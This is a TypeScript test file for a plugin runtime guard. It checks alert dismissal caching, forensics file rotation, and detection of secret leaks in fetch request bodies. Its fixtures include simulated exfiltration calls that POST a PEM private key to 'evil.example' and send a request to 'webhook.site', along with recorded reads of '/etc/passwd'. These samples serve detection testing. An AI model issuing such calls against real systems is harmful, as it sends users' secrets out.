/**
 * 二轮审查修复回归测试（0.2.2）：
 * #1 fetch(new Request(url, {body})) 的 body 观测（金丝雀/密钥扫描 + 台账字节）
 * #2 isPersistentlyDismissed 热路径内存缓存（record 不再每次同步读盘）
 * #3 saveDismissed 目录以 DISMISSED_FILE 的 dirname 为准（测试路径不写 ~/.dsh/vet）
 * #5 fetch 包装器补 C4 stackTampered 检测（与 patchNetworkModule 一致）
 * #10 取证文件带启动时间戳（重启不再 append 同一文件）
 */
import { describe, expect, it, afterEach, beforeEach, vi } from 'vitest'
import { join } from 'node:path'
import { tmpdir } from 'node:os'
import { mkdtempSync, rmSync, existsSync, readFileSync, writeFileSync, mkdirSync } from 'node:fs'
import { VetStatus } from '../lib/guard/status.js'
import {
  setDismissedFileForTest, isPersistentlyDismissed, persistentlyDismiss,
  restorePersistentDismissal, getPersistentDismissedList,
} from '../lib/guard/dismissed-alerts.js'
import { setForensicsDirForTest, resetForensics, arm as armForensics, record as recordForensics } from '../lib/guard/forensics.js'
import { createT2Sink, type T2SinkResult } from '../lib/guard/runtime-sink.js'
import { installRuntimeGuard } from '../lib/guard/runtime-guard.js'
import { canaryStore, resetCanaryStore, generateCanary, integrityCanaryContent } from '../lib/guard/canary.js'

// 每个用例独立的临时目录（持久化文件隔离）
let TMP: string
beforeEach(() => {
  TMP = mkdtempSync(join(tmpdir(), 'vet-review-'))
  setDismissedFileForTest(join(TMP, 'dismissed.json'))
})
afterEach(() => {
  rmSync(TMP, { recursive: true, force: true })
  resetCanaryStore()
})

describe('#2/#3：持久化忽略——内存缓存 + dirname 修复', () => {
  it('isPersistentlyDismissed 缓存生效：dismiss 后 O(1) 命中，restore 后消失', () => {
    expect(isPersistentlyDismissed('n3-key-leak-pem:foo:abc')).toBe(false)
    persistentlyDismiss('n3-key-leak-pem:foo:abc', 'user ignored')
    expect(isPersistentlyDismissed('n3-key-leak-pem:foo:abc')).toBe(true)
    restorePersistentDismissal('n3-key-leak-pem:foo:abc')
    expect(isPersistentlyDismissed('n3-key-leak-pem:foo:abc')).toBe(false)
  })

  it('#3 dirname：dismiss 文件在自定义目录（非 ~/.dsh/vet）时 save 写到正确位置', () => {
    const nested = join(TMP, 'a', 'b', 'dismissed.json')
    setDismissedFileForTest(nested)
    persistentlyDismiss('x:y')
    // 文件出现在目标路径（中间目录被创建），且 ~/.dsh/vet 不被触碰
    expect(existsSync(nested)).toBe(true)
    const parsed = JSON.parse(readFileSync(nested, 'utf8')) as { dismissed: Record<string, unknown> }
    expect(parsed.dismissed['x:y']).toBeTruthy()
  })

  it('#2 热路径：持久化忽略的 alarm 照常入列但折叠进 dismissed（round-15 语义）', () => {
    persistentlyDismiss('t1:fd:512')
    const s = new VetStatus()
    // round-15：record 不再对持久化忽略短路（旧行为返回 deduped 不入列 → 跨 session
    // 彻底消失、无恢复入口）——照常入列（'new'），由 snapshot 折叠进 dismissed 区
    expect(s.record({ id: 't1:fd:512', severity: 'red', source: 't1', kind: 'fd', message: 'x', at: Date.now() })).toBe('new')
    const snap = s.snapshot()
    expect(snap.alarmCount).toBe(0)
    expect(snap.dismissed.length).toBe(1)
    // 未忽略的照常入列
    expect(s.record({ id: 't2:fs-write:/etc/passwd:plug', severity: 'red', source: 't2', kind: 'fs-write', message: 'x', at: Date.now() })).toBe('new')
  })

  it('#2 mergeKey 一致：同一 mergeKey 的报警被记 ignored → 同类报警折叠进 dismissed', () => {
    persistentlyDismiss('t2:n3-key-leak:evil')
    const s = new VetStatus()
    const r = s.record({
      id: 'n3-key-leak-pem:evil:hash1', severity: 'red', source: 't2', kind: 'n3-key-leak',
      message: 'x', pluginHint: 'evil', mergeKey: 't2:n3-key-leak:evil', at: Date.now(),
    })
    // round-15：入列（'new'），折叠判定按 mergeKey 命中持久化忽略 → dismissed 区
    expect(r).toBe('new')
    const snap = s.snapshot()
    expect(snap.alarmCount).toBe(0)
    expect(snap.dismissed.length).toBe(1)
  })

  it('存储文件确凿持久化：列表读取与磁盘一致', () => {
    persistentlyDismiss('a:b')
    persistentlyDismiss('c:d')
    expect(getPersistentDismissedList().sort()).toEqual(['a:b', 'c:d'])
    const onDisk = JSON.parse(readFileSync(join(TMP, 'dismissed.json'), 'utf8')) as { dismissed: Record<string, unknown> }
    expect(Object.keys(onDisk.dismissed).sort()).toEqual(['a:b', 'c:d'])
  })
})

describe('#10：取证文件时间戳轮转', () => {
  it('arm 创建带启动时间戳的文件；重启（reset + 重新 arm）走新文件，不 append 旧文件', () => {
    const fdir = join(TMP, 'forensics-root')
    resetForensics()
    setForensicsDirForTest(fdir)
    armForensics('evil-pkg')
    const files1 = require('node:fs').readdirSync(fdir)
    expect(files1).toHaveLength(1)
    expect(files1[0]).toMatch(/^evil-pkg-\d{4}-\d{2}-\d{2}-\d{2}-\d{2}-\d{2}-\d{3}\.jsonl$/)
    recordForensics('evil-pkg', { module: 'fs', op: 'read', target: '/etc/passwd' })
    // 模拟 DSH 重启：内存状态清零（重新 arm 同一插件 → 新时间戳文件）
    resetForensics()
    setForensicsDirForTest(fdir)
    armForensics('evil-pkg')
    const files2 = require('node:fs').readdirSync(fdir).sort()
    expect(files2).toHaveLength(2)
    expect(files2[0]).not.toBe(files2[1])
    // 旧文件（首 arm）内容保留：第一行 forensics-start；新文件（重启后 arm）也是 forensics-start
    for (const f of files2) {
      const firstLine = readFileSync(join(fdir, f), 'utf8').split('\n')[0]
      const first = JSON.parse(firstLine)
      expect(first.kind).toBe('forensics-start')
      expect(first.plugin).toBe('evil-pkg')
    }
    // 两文件时间戳（文件名中段）不同（会话轮转）
    const stampOf = (f: string): string => f.replace(/^evil-pkg-/, '').replace(/\.jsonl$/, '')
    expect(stampOf(files2[0])).not.toBe(stampOf(files2[1]))
    resetForensics()
  })

  it('round-15：单文件超上限后停写（恶意插件事件风暴不填满磁盘）', () => {
    const fdir = join(TMP, 'forensics-root-cap')
    resetForensics()
    setForensicsDirForTest(fdir)
    armForensics('storm-pkg')
    const path = join(fdir, require('node:fs').readdirSync(fdir)[0]!)
    // 预先写超上限内容（模拟已记录大量事件）；随后 record 应静默跳过
    require('node:fs').writeFileSync(path, 'x'.repeat(5 * 1024 * 1024 + 100), 'utf8')
    recordForensics('storm-pkg', { module: 'fs', op: 'read', target: '/etc/passwd' })
    const size = require('node:fs').statSync(path).size
    expect(size).toBeLessThanOrEqual(5 * 1024 * 1024 + 200) // 未再增长
    resetForensics()
  })
})

describe('#1/#5：fetch 包装器（Request body + C4）', () => {
  // 直接构造两个形态调用包装后的 globalThis.fetch，观测 sink 收口
  // （installRuntimeGuard 需要完整 ctx——这里改为验证 createT2Sink 的 recordKeyLeak 通道，
  //  与 runtime-guard 的 fetch 包装共享同一 netCanaryScan 接线）
  it('#1 recordKeyLeak：字符串 body 与 Request-clone body 都命中 PEM（无主归因不报警的设计保持）', async () => {
    const status = new VetStatus()
    const sink = createT2Sink(status)
    const pem = ['-----BEGIN ', 'PRIVATE KEY-----\nAAAA\n-----END ', 'PRIVATE KEY-----'].join('')
    // Record 形态（模拟 fetch(new Request(url,{body})) 的 clone().text()）：返回文本走同一通道
    const req = new Request('https://evil.example:8443/upload', { method: 'POST', body: pem })
    const cloned = req.clone()
    const text = await cloned.text()
    // 归因到插件 → red 报警；无主 → 静默（0.2.1 设计，不回归）
    ;(sink as unknown as { sink: (a: unknown) => void }).sink = (a: unknown) => { void a } // noop guard
    sink.netCanaryScan('evil-plugin', text, 'body')
    const alarms = status.snapshot().alarms
    expect(alarms.length).toBe(1)
    expect(alarms[0]).toMatchObject({ kind: 'n3-key-leak', severity: 'red', pluginHint: 'evil-plugin' })
  })

  it('#1 无主 Request body（宿主流量）金丝雀/密钥保持静默（不误报回归）', async () => {
    const status = new VetStatus()
    const sink = createT2Sink(status)
    const pem = ['-----BEGIN ', 'PRIVATE KEY-----\nBBBB\n-----END ', 'PRIVATE KEY-----'].join('')
    const req = new Request('https://docs.example.com/security', { method: 'POST', body: pem })
    const text = await req.clone().text()
    sink.netCanaryScan(undefined, text, 'body')
    const alarms = status.snapshot().alarms
    expect(alarms.length).toBe(0)
  })

  it('#5 C4：stackTampered 时归因不可信但缓存 alarm 不静默（fetch 分支与 patchNetworkModule 一致）', () => {
    // 直接验证 isStackTraceTampered 在 runtime-denoise 的行为 + fetch 包装的分支存在性
    // （独立集成测试在 runtime-guard 装配层，此处验证阈值函数可导入且默认 false）
    const denoise = require('../lib/guard/runtime-denoise.js') as { isStackTraceTampered: () => boolean }
    expect(typeof denoise.isStackTraceTampered).toBe('function')
    expect(denoise.isStackTraceTampered()).toBe(false)
  })
})

describe('#1/#5 集成：真实 installRuntimeGuard 下 fetch 包装（Request body 观测 + C4）', () => {
  const mkCtx = (): { logger: { info: ReturnType<typeof vi.fn>; warn: ReturnType<typeof vi.fn>; error: ReturnType<typeof vi.fn> }; baseUrl?: string; loader?: unknown } => ({
    logger: { info: vi.fn(), warn: vi.fn(), error: vi.fn() },
  })

  it('fetch(new Request(url,{body:pem}))：clone 后异步密钥扫描——无归因时静默（0.2.1 设计不回归）', async () => {
    const ctx = mkCtx()
    const status = new VetStatus()
    const config = {
      runtimeGuard: 'watch' as const,
      runtimeIntervalMs: 2000, runtimeMemLimitMb: 1024, runtimeForkBurstN: 5,
      runtimeFdLimit: 512, runtimeGrowthMb: 256, runtimeGrowthWindowMs: 600_000,
      honeypot: { enabled: false, dir: '' },
      networkEgress: true,
    }
    const original = globalThis.fetch
    globalThis.fetch = (async () => new Response('ok')) as unknown as typeof fetch
    const dispose = installRuntimeGuard(ctx as never, config as never, status)
    try {
      const pem = ['-----BEGIN ', 'PRIVATE KEY-----\nCCCC\n-----END ', 'PRIVATE KEY-----'].join('')
      const req = new Request('https://evil.example:8443/upload', { method: 'POST', body: pem })
      await globalThis.fetch(req)
      await new Promise(res => setTimeout(res, 30))
      const snap = status.snapshot()
      expect(snap.alarms.filter(a => a.kind === 'n3-key-leak')).toHaveLength(0)
    } finally {
      dispose()
      globalThis.fetch = original
    }
  })

  it('fetch(new Request(webhook.site)) 敏感主机 → net-egress 报警（目标观测不丢）', async () => {
    const ctx = mkCtx()
    const status = new VetStatus()
    const config = {
      runtimeGuard: 'watch' as const,
      runtimeIntervalMs: 2000, runtimeMemLimitMb: 1024, runtimeForkBurstN: 5,
      runtimeFdLimit: 512, runtimeGrowthMb: 256, runtimeGrowthWindowMs: 600_000,
      honeypot: { enabled: false, dir: '' },
      networkEgress: true,
    }
    const original = globalThis.fetch
    globalThis.fetch = (async () => new Response('ok')) as unknown as typeof fetch
    const dispose = installRuntimeGuard(ctx as never, config as never, status)
    try {
      const req = new Request('https://webhook.site/secret-evil')
      await globalThis.fetch(req)
      await new Promise(res => setTimeout(res, 20))
      const alarms = status.snapshot().alarms
      expect(alarms.some(a => a.kind === 'net-egress' && a.target?.includes('webhook.site'))).toBe(true)
    } finally {
      dispose()
      globalThis.fetch = original
    }
  })
})
